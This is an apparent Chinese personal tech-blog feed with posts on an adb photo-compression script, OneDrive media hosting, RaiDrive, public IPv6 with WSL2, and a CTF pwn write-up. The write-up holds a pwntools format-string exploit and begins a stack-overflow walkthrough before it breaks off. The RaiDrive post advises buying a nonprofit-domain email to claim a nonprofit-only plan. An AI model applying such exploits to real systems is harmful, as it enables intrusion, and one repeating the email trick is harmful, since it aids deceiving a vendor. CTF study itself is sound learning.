    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-gIPfujgZ" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="547973265" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>作者用的手机是Redmi K20 Pro。去年11月份之前一直用着小米云盘的黄金会员，容量50GB。后来就不用了，原因是我的图片总容量超过了50GB，升级到更高级的会员200GB空间大概每年需要300块，作为一个穷学生可承受不起，后来我的图片备份方案是上传到阿里云盘。</p><p>小米云盘很坑，但是它有一个功能非常好，就是进行<strong>图片瘦身</strong>。高清图片保留在云端，本地只留下压缩后的图。而小米官方的瘦身非常给力，原图和瘦身图几乎看不出差别。</p><p>我非常喜欢图片瘦身的功能，可惜在我不用黄金会员之后就不能再使用这个功能了。自去年11月以来，图片的总占用空间已经逼近10GB。</p><p>我便想手动撸一个瘦身脚本。</p><h2 id="如何实现的"><a class="markdownIt-Anchor" href="#如何实现的"></a> 如何实现的？</h2><p>利用Python的Pillow库，它<code>Image.save</code>函数将默认给图片进行压缩，压缩后的容量大概是原容量的<code>1/5</code>。</p><p>在用<code>save</code>函数的时候，我们需要注意一个点，默认的保存不会保存原图的exif信息，exif信息记录着我们的拍摄时间、拍摄地点等信息，而exif的拍摄时间正是小米手机相册的排序方式。我们在保存的时候注意得保存exif信息。</p><p>这个脚本的具体流程大概如下。</p><ol><li><p><strong>adb shell ls</strong> 获取相册下的所有图片名 放到 <strong>files.txt</strong> 文件中</p></li><li><p>你需要手动选择 <strong>files.txt</strong> 中哪些文件需要被压缩</p></li><li><p><strong>adb pull</strong> 命令把文件拉到电脑上</p></li><li><p>Pillow库压缩，程序会把容量大于2MB的图片进行压缩。</p></li><li><p><strong>adb shell rm</strong> 删除手机上的原图</p></li><li><p><strong>adb push</strong> 命令把压缩后的文件放回手机</p></li><li><p><strong>adb am broadcast</strong> 发送广播，让系统相册刷新</p></li></ol><p>我在实践过程中发现直接adb push一个文件到相册目录下，系统的相册无法识别到这个文件，后来查到相关资料，我们需要手动发送一个广播刷新MediaStore，才能让相册刷新，这也是第七步存在的原因。</p><h2 id="使用方法"><a class="markdownIt-Anchor" href="#使用方法"></a> 使用方法</h2><ol><li><p>推荐在使用之前先把原图备份，比如备份到阿里云盘。因为此项目会直接替换原图为瘦身图，会删除原图。</p></li><li><p>确保你的手机连接到电脑并开启usb调试</p></li><li><p>克隆此项目，进入文件夹。</p></li><li><p>执行<code>adb shell ls /storage/emulated/0/DCIM/Camera &gt; files.txt</code>命令</p></li><li><p>在 <code>files.txt</code> 中手动选择哪些你需要压缩的图片们，请务必删除掉mp4等视频文件。</p><blockquote><p>推荐在 files.txt 里填入少量文件先尝试一下脚本效果。如果一切顺利，请添加你需要压缩的所有图片。</p></blockquote></li><li><p>由于<code>files.txt</code>是由cmd命令行重定向生成的，文件编码格式比较神秘，你需要在vscode中通过编码保存为utf-8格式。</p><blockquote><p>或者你可以把files.txt你已经选择好的文件名复制到 记事本 中，然后保存为一份新的 files.txt  。然后在替换本项目中的神秘格式的旧files.txt</p></blockquote></li><li><p>执行 <code>pip3 install -r requirements.txt</code> 安装Pillow库依赖</p></li><li><p>执行<code>python3 ./slim.py</code>  即可开启瘦身之旅。</p></li></ol><h2 id="运行截图"><a class="markdownIt-Anchor" href="#运行截图"></a> 运行截图</h2><p><img src="https://upyun.wuuconix.link/image-20220308001645895.png" alt="运行" /></p><h2 id="效果演示视频"><a class="markdownIt-Anchor" href="#效果演示视频"></a> 效果演示视频</h2><video style="box-shadow: 0 5px 11px 0 rgb(0 0 0 / 18%), 0 4px 15px 0 rgb(0 0 0 / 15%); border-radius: 3px;" poster="https://sina.wuuconix.link/large/007YVyKcly1h2b95ssjs8j31hb0u01kx.jpg" controls width="100%">  <source src="https://uconix-my.sharepoint.com/:v:/g/personal/wu_uconix_onmicrosoft_com/EXkFBUir3txNlyuS-Yg3YToBFPLIbUYudPr-xXUTFWnY7A?download=1" type="video/mp4"></video><h2 id="手机图片容量变化"><a class="markdownIt-Anchor" href="#手机图片容量变化"></a> 手机图片容量变化</h2><p><img src="https://upyun.wuuconix.link/B495DBFEAF3C7A8931BA519106708183.jpg" alt="原先的9.17GB" /></p><p><img src="https://upyun.wuuconix.link/FE55AD402A50DEC6C556A777CDDD00BF.jpg" alt="瘦身后的3.81GB" /></p><p>从瘦身之前的<strong>9.17GB</strong>变成了瘦身后的 <strong>3.81GB</strong>，总共节省出了 <strong>5.35GB</strong>。</p><p>这还只是4个月的图片。一年就可以节省出 <strong>15GB</strong>的空间。</p><h2 id="github链接"><a class="markdownIt-Anchor" href="#github链接"></a> Github链接</h2><p><a href="https://github.com/wuuconix/Mobile-Photo-Slim">wuuconix/Mobile-Photo-Slim: 手机图片瘦身 (github.com)</a></p><p>来个Star吧2333</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>adb</tag>
      
      <tag>pillow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OneDrive的妙用 图/音频/视频床</title>
    <link href="/2022/03/02/onedrive/"/>
    <url>/2022/03/02/onedrive/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-IWVcuETw" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="534065323" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前做了一个荣誉墙的网站，放了一些大学以来获得的奖状和证书。</p><p>由于图片比较私密，我便没有放到常用的gitee图床和github图床上。考虑到我的阿里云水管实在是太小了，我便把图片都放在了带宽较大的国外服务器上。</p><p>然而国外服务器又面临着过期的风险，我想要寻找一个又私密、又快速的存储空间提供外联。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><p>今天上课无聊，我找到了<a href="https://mapaler.github.io/GetOneDriveDirectLink/">获取OneDrive直链 (mapaler.github.io)</a>这个项目，它可以调用微软官方api，从而获取你选择的文件的直链，而且可以实现批量化和自动化。</p><p>比如我这里选中三个文件。</p><p><img src="https://upyun.wuuconix.link/image-20220302232654992.png" alt="选择三个文件" /></p><p>点击确认后，该项目就会直接得到三个文件的直链，而不需要一个个来获得直链。</p><p><img src="https://upyun.wuuconix.link/image-20220302232811980.png" alt="直链输出" /></p><h2 id="效果演示"><a class="markdownIt-Anchor" href="#效果演示"></a> 效果演示</h2><h3 id="图床"><a class="markdownIt-Anchor" href="#图床"></a> 图床</h3><p>下面这张图片，便是用的OneDrive的直链。</p><img style="box-shadow: 0 5px 11px 0 rgb(0 0 0 / 18%), 0 4px 15px 0 rgb(0 0 0 / 15%); border-radius: 3px;" src="http://storage.live.com/items/DBB9EA447F55959D!577:/Attack 進撃.jpg?authkey=AO_cg8p0enDd7DI"><h3 id="音频床"><a class="markdownIt-Anchor" href="#音频床"></a> 音频床</h3><p>不止图片，我们还可以使用以下html代码外链音频。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;mp3&#x27;s url&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 20px; width: 100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">audio</span>&gt;</span><br></code></pre></td></tr></table></figure><p><audio controls src="http://storage.live.com/items/DBB9EA447F55959D!578:/SiM - The Rumbling.mp3?authkey=AO_cg8p0enDd7DI" style="margin-top: 20px; width: 100%"><audio></p><h3 id="视频床"><a class="markdownIt-Anchor" href="#视频床"></a> 视频床</h3><p>更令人兴奋的，OneDrive甚至支持视频外链。</p><p>HTMl代码类似下面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;mp4&#x27;s url&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里吐槽一下哔哩哔哩，用iframe嵌入的视频最高只支持360P的清晰度，这也太抠门了。以后博客如果还需要视频的话，就直接用OneDrive了</p></blockquote><p>来观赏最新一集的进击的巨人吧！（可能需要加载一会儿</p><video style="box-shadow: 0 5px 11px 0 rgb(0 0 0 / 18%), 0 4px 15px 0 rgb(0 0 0 / 15%); border-radius: 3px;" poster="https://sina.wuuconix.link/large/007YVyKcly1h2b957sa3gj31hc0u0qk0.jpg" controls width="100%">    <source src="http://storage.live.com/items/DBB9EA447F55959D!579:/[BeanSub][Shingeki_no_Kyojin][83][GB][1080P][x264_AAC].mp4?authkey=AO_cg8p0enDd7DI" type="video/mp4"></video><h2 id="写在最后"><a class="markdownIt-Anchor" href="#写在最后"></a> 写在最后</h2><p>以后我的一些比较私人图片的共享就用OneDrive啦！普通的博客图片还是用Gitee和Github图床了。</p><p>音频和视频啥的就直接丢OneDrive了。唯一不太好的一点就是OneDrive的上传速度有些慢，上面的视频我大概传了半个多小时。比起国内的不限速的网盘可慢多了。但是支持视频外链这一点就打败国内99%的网盘了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>图床</tag>
      
      <tag>onedrive</tag>
      
      <tag>音频床</tag>
      
      <tag>视频床</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Raidrive Pro? NonProfit!</title>
    <link href="/2022/02/24/raidrive/"/>
    <url>/2022/02/24/raidrive/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-uqHXiGMf" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1494812318" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>寒假的时候因为想要在本地挂载阿里云盘发现了<a href="https://www.raidrive.com/">RaiDrive</a>这个好东西。它支持多种协议，比如webdav、sftp协议的挂载，还支持许多网盘，比如onedrive和google drive等。</p><p>以下是我现在挂载的一些网盘/NAS。</p><p><img src="https://upyun.wuuconix.link/image-20220224165128798.png" alt="挂载" /></p><p>你可以直接像在本地磁盘中一样，访问网盘中的文件，甚至直接用本地播放器直接播放视频。</p><p><img src="https://upyun.wuuconix.link/image-20220224165345927.png" alt="视频" /></p><p>如果有服务器的同学，可以利用SFTP协议直接把你的云服务挂载到本地。这样你就能够像操作本地文件一样管理云服务器了。我之前实现类似的操作，借用的软件是winscp，但是现在已经不需要了。</p><p><img src="https://upyun.wuuconix.link/image-20220224165555036.png" alt="云服务器挂载" /></p><h2 id="免费版的苦恼"><a class="markdownIt-Anchor" href="#免费版的苦恼"></a> 免费版的苦恼</h2><p><img src="https://upyun.wuuconix.link/image-20220224165755969.png" alt="官网" /></p><p>从官网的Plans中我们可以看到，相比于Pro版本，免费的Standard版本最多只能挂载8个网盘。并且有广告的频繁困扰。</p><p>我把阿里云服务器、国外某服务器、实验室小主机、旧手机服务器、OneDrive、自己开的Nextcloud webdav、阿里云盘webdav、坚果云挂载后发现挂满了，而我还想挂载一些国外的网盘（<s>实际上没啥作用，单纯上头</s>）。</p><blockquote><p>这里注意一下，由于国外的网盘，比如Google Drive肯定需要挂代理，但是RaidDrive最新版本2021.12.25版本已经不支持本地代理了。</p><p>我测试后，发现 2021.10.9 以后的版本就不能支持本地代理了。</p><p>2021.10.9版本下载链接 <a href="https://url.wuuconix.link/raidrive">https://url.wuuconix.link/raidrive</a></p></blockquote><p>但是Pro版本高达2美元一个月的费用让我这个穷学生负担不起。于是我在网上找起了破解版。但是无疾而终。</p><h2 id="noneprofit-无盈利版本"><a class="markdownIt-Anchor" href="#noneprofit-无盈利版本"></a> NoneProfit 无盈利版本</h2><p>这是我在淘宝店里找到的关键词。实际上它就在raidrive的菜单栏里。 <a href="https://www.raidrive.com/together">Together (raidrive.com)</a></p><p><img src="https://upyun.wuuconix.link/image-20220224170659442.png" alt="Nonprofit" /></p><p>它仅仅需要2美元一年。而且第一年免费，并且和pro版本无异，没有对网盘数量的限制，也没有广告。这个计划是对国际上非营利组织的优惠。</p><p>想要选择这个计划，你需要国际上知名非盈利组织的一个邮箱。</p><p>我暂时没有头绪，于是直接在某个淘宝店下单了，花了十块钱，店长给我发来一个邮箱。</p><p><img src="https://upyun.wuuconix.link/image-20220224180551366.png" alt="邮箱" /></p><p>该邮箱的域名是 <strong><a href="http://ikmfoundation.org">ikmfoundation.org</a></strong></p><p>访问了一下，<a href="https://www.ikfoundation.org/">The IK Foundation &amp; Company</a>大概是一个环境保护组织。</p><p><img src="https://upyun.wuuconix.link/image-20220224171351983.png" alt="ik foundation" /></p><p>所以你如果不想在淘宝店里花10块钱得到一个邮箱的话，你也许得研究一下如何在这个网站注册一个账号。</p><p>获得了账号之后，在raidrive登录账号，然后选择noneprofit计划。它会让让你绑定一个卡或者用paypal方式支付0元。</p><p>绑定paypal请参考 <a href="https://www.zhihu.com/question/330064919">中国人如何开通PayPal账号？ - 知乎 (zhihu.com)</a></p><p><img src="https://upyun.wuuconix.link/image-20220224171809030.png" alt="paypal注册" /></p><p>成功支付0元后，你就能在raidrive上看到你的版本变成了尊贵的<strong>RaidDrive Nonpromfit Edition</strong>了。</p><p><img src="https://upyun.wuuconix.link/image-20220224180925018.png" alt="版本" /></p><p>接下去你就能享受无限制的挂载和无广告啦！</p><p>Enjoy it！</p><h2 id="还想说的"><a class="markdownIt-Anchor" href="#还想说的"></a> 还想说的</h2><p>用必应搜索<code>raidrive非盈利版</code>找到了这个网站<a href="https://fk.smone.me/buy/17">Raidrive 非盈利版 | SMONE发卡站</a>。</p><p>只需要8元。我怀疑那个淘宝店的邮箱就是这里买的，然后转买为10块，店长赚2块。</p><p>如果你没有找到注册一个非盈利组织邮箱的方法，可以试试这个网站。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>raidrive</tag>
      
      <tag>webdav</tag>
      
      <tag>sftp</tag>
      
      <tag>paypal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天降公网ip</title>
    <link href="/2022/02/18/ipv6/"/>
    <url>/2022/02/18/ipv6/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-qjWBZGxB" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="27198348" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前因为家里是移动的宽带，不给你分配公网ip，所以你无法实现类似在逛街的时候远程连接家里的电脑之类的操作。</p><p>相比于移动，我哥家里的宽带是电信的，他一个电话过去，电信立马给了公网ip，所以他可以随时随地远程控制他的电脑，这令我很羡慕。</p><h2 id="内网穿透之旅"><a class="markdownIt-Anchor" href="#内网穿透之旅"></a> 内网穿透之旅</h2><p>当然了，在过去一个学期里，随着知识和经验的进步，我学会了内网穿透。简单的理解起来，它干的工作类似于端口转发，只不过我们把本地的服务转发到了一台有公网ip的云服务器上。</p><p>上个学期我购买了一台阿里云轻量级应用服务器，然后利用开源的内网穿透工具 <a href="https://github.com/fatedier/frp">fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a> ，我可以实现将局域网里的服务进行公网访问。</p><p>frp虽好，但是一个问题也一直困扰着我，这便是由于服务的传输完全经过云服务器，相当于云服务器担当了中间人，安全性我倒是不担心，因为是自己的，但是速度就非常慢了。众所周知，国内的云服务器带宽都十分感人，我的服务器**5Mb/s(0.625MB/s)**的带宽已经 鸡立鸡群了。</p><p>然后在这个寒假我又发现了一个基于Ngork的内网穿透软件 <a href="https://github.com/open-dingtalk/pierced">open-dingtalk/pierced: 钉钉内网穿透 (github.com)</a>。它的服务端部署在钉钉的国内高速机房里，带宽实测在<strong>3MB/s</strong>左右，已经非常快了。</p><h2 id="突然发现的ipv6"><a class="markdownIt-Anchor" href="#突然发现的ipv6"></a> 突然发现的IPV6</h2><p>昨天我在瞎玩的时候，突然发现我家的移动宽带是有公网ipv6的。</p><p>现在我教大家如何快速判断你所在的网络有没有IPV6。直接在powershell中输入<strong>ipconfig</strong>。</p><p><img src="https://upyun.wuuconix.link/image-20220218154619969.png" alt="ipconfig" /></p><p>如果有IPv6 Address，并且开头不是<strong>fe80</strong>的话，那就说明你很幸运的拥有了一个公网ipv6，这意味着你的电脑完全提供服务并在公网中访问。</p><p>还可以访问此网站 <a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a> 如果出现以下类似画面，说明你确实拥有一个公网ipv6。</p><blockquote><p>注意访问此网站请关闭代理工具，不然会得到代理服务器的ip，而一般的代理服务器都是不支持ipv6的。</p></blockquote><p><img src="https://upyun.wuuconix.link/image-20220218155702274.png" alt="ipv6地址查询工具" /></p><h2 id="ipv6的特点"><a class="markdownIt-Anchor" href="#ipv6的特点"></a> IPV6的特点</h2><p>也许大家会有个疑惑，按理说我的笔记本连在一个路由器下，得到的ip应该是一个内网ip，比如<code>192.168.1.60</code>。而为什么我笔记本上的ipv6能够直接是公网ip呢？</p><p>这大概是由于ipv6的数量实在是太多了。我们来简单算一笔账，我们知道ipv4一共是32位。</p><p><img src="https://upyun.wuuconix.link/image-20220218164742159.png" alt="ipv4的数量" /></p><p>所以总共ipv4的数量是43亿个，这对于这个信息化的世界来说，一个人可能有数台设备，一个公司里面可能有数百台设备，如果每台设备分配一个ip，这个ipv4是完全不够的，所以出现了NAT这种方式来缓解这种资源的紧张感，一台路由器下的所有设备都会被分到一个内网ip，这个内网ip是无法在公网中被访问的。</p><p>而ipv6是64位。</p><p><img src="https://upyun.wuuconix.link/image-20220218165048480.png" alt="ipv6的数量" /></p><p>它的数量我大概数了一下，应该是1844亿亿个。按全球人口70亿人来算，每个人都能分到263亿个ip。</p><p><img src="https://upyun.wuuconix.link/image-20220218165452735.png" alt="每个人能分到的ipv6个数" /></p><p>所以公网ip一下子从一个稀缺资源，变成了一个人唾手可得的资源。所以对于ipv6而言，NAT这种方式已经没有意义了，所以局域网下的所有设备都会被分到一个公网ipv6。</p><h2 id="手机流量也有ipv6"><a class="markdownIt-Anchor" href="#手机流量也有ipv6"></a> 手机流量也有IPV6</h2><p>昨天下午在发现家里宽带有公网ipv6后已经非常高兴了，晚上睡觉前又试了一下，发现我的移动卡也有IPV6！</p><p><img src="https://upyun.wuuconix.link/image-20220218160358771.png" alt="移动ipv6" /></p><p>可以看到因为我有两张移动卡，这里直接有两个ipv6。</p><p>没想到ipv6的推广如此迅速又如此悄无声息，大部分普通用户都没有意识到它手里掌握着许多公网ip。</p><h2 id="ipv6-wsl2"><a class="markdownIt-Anchor" href="#ipv6-wsl2"></a> IPV6 + WSL2</h2><p>有了公网ip，实际上我们已经能实现一开始说的情景了，不用内网穿透，直接在任何地点远程连接我的笔记本。由于比较简单，这里就不放图了。</p><p>平常我都用<strong>WSL2</strong>来作为生产力环境。我们都知道，windows对wsl2做了很强的适配，wsl2按理说是一个虚拟机，如果我们需要访问wsl2中的8081端口上的服务，按理说得到windows主机的浏览器输入<code>http://wsl2-ip:8081</code>的url才能访问到。</p><p>但是微软帮我们自动做了一层端口转发，wsl2内部的任意端口都会被转发到windows主机的对应端口上，所以，我们只需要在浏览器中输入<code>http://127.0.0.1:8081</code>就能访问到wsl2 8081端口上的的服务。</p><p><img src="https://upyun.wuuconix.link/image-20220218162638691.png" alt="8081" /></p><p>我在8081端口开了一个nextcloud。</p><p>所以我们现在能否直接通过<code>http://[ipv6]:8081</code>的方式来访问这个服务呢？</p><p>可以，但是需要以下两步设置。</p><ol><li><p>在高级防火墙设置中添加8081端口的入站规则</p><p><img src="https://upyun.wuuconix.link/image-20220218163124126.png" alt="入站规则" /></p></li><li><p>在poweshell将ipv6的端口的请求转发到ipv4对应端口</p><blockquote><p>这里有点绕，大概原因就是wsl2给我们的端口转发只是ipv4层面的，我们无法通过ipv6来访问对应服务，所以我们需要把ipv6对应端口的请求转发到ipv4对应的端口。</p><p>如果你的服务不是wsl2上的，而是直接在windows主机中开启的服务，按理说该服务会同时相应ipv4和ipv6的请求，你就不用干这一步了，只需要执行第一步的增加入栈规则。</p></blockquote><p>在powershell中以管理员方式执行以下指令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh interface portproxy add v6tov4 listenport=<span class="hljs-number">8081</span> connectport=<span class="hljs-number">8081</span><br></code></pre></td></tr></table></figure><p>然后你可以通过以下指令查看转发是否成功</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh interface portproxy show all<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220218163650430.png" alt="show all" /></p></li></ol><p><img src="https://upyun.wuuconix.link/image-20220218164002538.png" alt="ipv6访问" /></p><p>可以看到，成功使用ipv6访问服务。</p><p>用手机尝试下载文件时，可以看到速度达到<code>7MB/s</code>。这应该受限于我家的宽带的带宽，如果你家是千兆宽带，那就直接起飞了。</p><p><img src="https://upyun.wuuconix.link/image-20220218164123210.png" alt="速度" /></p><h2 id="美中不足"><a class="markdownIt-Anchor" href="#美中不足"></a> 美中不足</h2><p>受到国家政策的限制，运营商都对80/443端口进行了封锁，应对服务器满天飞而造成监管难度过大的困境。</p><p>所以我们暂时只能用其他的端口提供服务。</p><p>丑是丑了点，但是想到这美妙的带宽，一切都是值得的，而且，白嫖的公网ip嘛！要什么摩托车。</p><h2 id="写在最后"><a class="markdownIt-Anchor" href="#写在最后"></a> 写在最后</h2><p>后天就去学校了，我希望校园网也有ipv6，之前没有注意过，如果真的有，真的就可以告别内网穿透了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ipv6</tag>
      
      <tag>公网ip</tag>
      
      <tag>移动</tag>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN PWN PWN！</title>
    <link href="/2022/01/30/pwn/"/>
    <url>/2022/01/30/pwn/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-MBEDHQNJ" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1830411330" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h2><p>作为一个半退役的CTF web选手，在大三上学习了编译原理和操作系统原理之后，感觉可以学习pwn了！下面写一下在buu和攻防世界上pwn专题的刷题记录。</p><h2 id="攻防世界"><a class="markdownIt-Anchor" href="#攻防世界"></a> 攻防世界</h2><h3 id="1cgfsb"><a class="markdownIt-Anchor" href="#1cgfsb"></a> 1.CGfsb</h3><p>作为攻防世界pwn新手区的第一题，它的考点是printf函数的格式化字符串漏洞。</p><p>利用IDA64进行反编译后，在main函数中，我们发现了以下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )<br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you pwned me, here is your flag:\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>只要pwnme为8，我们就能获得flag。而在该题中，我们传入的一个参数s将直接作为printf的参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">fgets(s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-comment">//...</span><br><span class="hljs-built_in">printf</span>(s); <span class="hljs-comment">//漏洞所在点</span><br></code></pre></td></tr></table></figure><p>实际上我们可以往s这个字符串里输入一个格式化的内容，比如 <code>%s</code>之类的，在c提供的一些格式化符号中，利用 <code>%n</code>可以实现内存任意写，理论上代码里定义的变量，我们都可以进行修改。</p><p>但是由于我十分菜，还不太会写payload，但是pwntools中提供了一个函数<code>fmtstr_payload</code>，只要我们输入一些参数，pwntools就能帮助我们快速构建payload。</p><p><code>fmstr_payload</code>需要传递的参数主要是 偏移量offset 和一个字典，字典内部的key表示你要修改的变量的内存地址，value则表示修改后的值。</p><p>而这个offset是一个神秘的值，我不太理解它到底是什么，但是能够模仿大佬们的wp知道怎么求出这个值。</p><ol><li><p>使用 AAAA %08x %08x %08x…的方式，找到41414141所在的位置，即offset</p><p><img src="https://upyun.wuuconix.link/image-20220130180617501.png" alt="%08x get offset" /></p></li><li><p>和第一种类似，只不过把%08x 换成 %p</p><p><img src="https://upyun.wuuconix.link/image-20220130180717003.png" alt="%p" /></p></li></ol><p>实际情况下，%08x或者%p的数量可以多一些，这样某个神秘的指针就会在一次次调用中不断往后，直到找到41414141，即AAAA的ascii值，你就获得了你能够控制的格式化字符串的offset 偏移量。</p><p>然后第二个参数字典就非常容易了，在这道题中我们需要改变的pwnme变量的地址是 0x0804A068，然后想要改变为的值是8，我们就这样写来构造payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = fmtstr_payload(<span class="hljs-number">10</span>, &#123;<span class="hljs-number">0x080A4068</span>: <span class="hljs-number">8</span>&#125;)<br></code></pre></td></tr></table></figure><p>最终的payload如下。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./cgfsb&#x27;</span>)<br><span class="hljs-comment"># sh = remote(&quot;111.200.241.244&quot;, 64676)</span><br><br>pwnme_addr = <span class="hljs-number">0x0804A068</span><br>sh.sendline(<span class="hljs-string">&quot;wuuconix&quot;</span>)<br>payload = fmtstr_payload(<span class="hljs-number">10</span>, &#123; pwnme_addr: <span class="hljs-number">8</span> &#125;)<br>sh.recvuntil(<span class="hljs-string">&quot;please:\n&quot;</span>)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="2level0"><a class="markdownIt-Anchor" href="#2level0"></a> 2.level0</h3><p>最简单的栈溢出。</p><p>栈溢出的思想就是通过程序中没有控制输入的长度，从而超出了某个变量应该限制的范围，影响到了外面的return之类的东西，从而进行程序流的劫持，比如我们把本来return后程序就结束了，然后我们把return的返回地址指导了一个backdoor函数，而这个后门函数一般就是一个shell，我们可以用来 cat flag。</p><p>在这道题中，我们利用IDA64可以看到一个<code>vulnerable_function</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><p>按理说buf字符串的长度应该只有128，但是这个程序却用read读了0x200这么长，即512的长度。</p><p>所以我们在把正常buf的内容用随便一些字符覆盖完后，我们就可以进行一些劫持工作了。</p><p>在IDA64中双击buf变量，我们可以看到buf的栈使用情况。</p><p><img src="https://upyun.wuuconix.link/image-20220130185135716.png" alt="buf stack" /></p><p>我们可以看到buf 有0x80个空间，然后就是一个s和r。</p><p>这两个具体是啥我也不太懂，但是我们可以通过覆盖<strong>r</strong>中的值从而改变程序流向。</p><p>该程序中还存在一个<code>callsystem</code>函数，很显然，这就是我们期盼的后门函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 